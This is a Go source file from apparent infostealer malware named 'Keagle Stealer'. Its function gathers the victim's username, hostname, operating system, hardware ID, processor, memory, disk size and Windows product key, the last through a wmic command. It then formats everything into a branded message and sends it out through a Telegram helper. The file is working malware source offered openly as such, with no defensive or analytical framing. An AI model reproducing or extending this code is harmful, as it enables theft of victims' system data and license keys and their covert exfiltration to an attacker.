package scripts

import (
	"fmt"
	"github.com/denisbrodbeck/machineid"
	"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/disk"
	"github.com/shirou/gopsutil/host"
	"github.com/shirou/gopsutil/v4/mem"
	"os/exec"
	"os/user"
	"strconv"
	"strings"
)

func GetSystemInformation() {

	var key string

	hostStat, _ := host.Info()
	cpuStat, _ := cpu.Info()
	vmStat, _ := mem.VirtualMemory()
	diskStat, _ := disk.Usage("\\")
	userN, _ := user.Current()
	hwid, _ := machineid.ID()

	hostname := hostStat.Hostname
	username := userN.Username
	platform := hostStat.Platform
	processor := cpuStat[0].ModelName
	memoryBrut := vmStat.Total / 1024 / 1024
	disks := diskStat.Total / 1024 / 1024 / 1024

	parts := strings.Split(username, "\\")

	cmd := exec.Command("cmd", "/C", "wmic path softwarelicensingservice get OA3xOriginalProductKey")
	output, _ := cmd.Output()
	result := strings.TrimSpace(string(output))
	lines := strings.Split(result, "\n")

	if len(lines) > 1 {

		key = strings.TrimSpace(lines[1])

	}

	if len(parts) > 1 {

		username = parts[1]

	}

	memory := strconv.FormatUint(memoryBrut, 10)
	diskTotal := strconv.FormatUint(disks, 10)

	message := fmt.Sprintf(
		"<b><u>🦅 Keagle Stealer</u> - System Informations</b>\n\n"+
			"👤<b> Username:</b> <code>%s</code>\n"+
			"🔬<b>Desktop Name:</b> <code>%s</code>\n"+
			"📺<b> Operating System:</b> <code>%s</code>\n"+
			"🔧<b> HWID:</b> <code>%s</code>\n"+
			"⚙<b> Processor:</b> <code>%s</code>\n"+
			"🎞<b> Memory:</b> <code>%sGB</code>\n"+
			"💾<b> Disk:</b> <code>%sGB</code>\n\n"+
			"🔑<b> Windows Key:</b> <code>%s</code>\n",
		username, hostname, platform, hwid, processor, memory[:2], diskTotal, key)

	r := SendTelegramMessage(message)

	if r == true {
	}

}
